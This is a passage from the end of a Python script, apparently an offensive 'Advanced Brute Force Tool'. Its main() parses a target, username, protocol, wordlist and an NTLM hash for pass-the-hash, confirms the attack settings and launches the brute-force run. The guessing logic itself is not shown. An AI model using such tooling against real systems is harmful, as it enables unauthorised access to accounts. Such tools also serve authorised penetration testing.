            sys.exit(1)
    
    # Parse arguments
    parser = argparse.ArgumentParser(description="Advanced Brute Force Tool")
    parser.add_argument("--quick", action="store_true", help="Run quick test")
    parser.add_argument("--target", help="Target IP")
    parser.add_argument("--username", help="Username")
    parser.add_argument("--protocol", choices=[p.value for p in Protocol], help="Protocol")
    parser.add_argument("--port", type=int, help="Port")
    parser.add_argument("--wordlist", help="Wordlist file")
    parser.add_argument("--hash", help="NTLM hash for pass-the-hash")
    
    args = parser.parse_args()
    
    # Quick test mode
    if args.quick:
        quick_test_mode()
        return
    
    # Interactive mode
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.YELLOW}[*] ADVANCED BRUTE FORCE TOOL")
    print(f"{Fore.CYAN}{'='*60}")
    
    attack_type = interactive_menu()
    config = get_attack_config(attack_type)
    
    # Confirm
    print(f"\n{Fore.YELLOW}[*] CONFIRM ATTACK")
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.WHITE}Target: {config.target}:{config.port}")
    print(f"Protocol: {config.protocol.value.upper()}")
    print(f"Username: {config.username}")
    if config.domain:
        print(f"Domain: {config.domain}")
    print(f"Threads: {config.threads}")
    print(f"Timeout: {config.timeout}s")
    print(f"Delay/Jitter: {config.delay}s/{config.jitter}s")
    print(f"{Fore.CYAN}{'='*60}")
    
    response = input(f"{Fore.YELLOW}[?] Start attack? (y/N): ").strip().lower()
    if response not in ['y', 'yes']:
        print(f"{Fore.YELLOW}[*] Cancelled")
        sys.exit(0)
    
    # Run attack
    tool = AdvancedBruteForce(config)
    tool.run(verbose=True)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
